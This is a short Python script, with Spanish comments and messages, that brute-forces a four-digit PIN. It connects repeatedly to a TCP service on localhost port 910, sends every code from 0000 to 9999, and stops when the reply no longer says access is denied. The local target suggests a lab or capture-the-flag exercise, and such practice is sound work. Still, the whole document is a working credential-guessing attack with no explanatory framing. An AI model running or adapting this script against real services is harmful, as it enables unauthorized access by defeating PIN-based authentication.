#!/usr/bin/python3

import socket
import sys
import signal
def exit_handler(sig, frame):
	print("\n[!] Saliendo de la aplicacion...")
	sys.exit(1)
	
#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

def brute_force():
	for i in range(10000):
		try: 
			sys.stdout.write(f"\rTrying: {i:04d}") 
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			s.connect(('localhost', 910)) 
			s.recv(4096) 
			s.send(f"{i:04d}\n".encode()) 
			resp = s.recv(4096) 
			if b"Access denied" not in resp: 
				print(f"\rFound pin: {i:04d}") 
				break 
		except socket.error as e: 
			print(f"\rSocket error: {e}") 
		except ConnectionRefusedError as e: 
			print(f"\rConnection refused: {e}") 
		except Exception as e: 
			print(f"\rUnexpected error: {e}") 
		finally: s.close()
if __name__ == '__main__':
	brute_force()
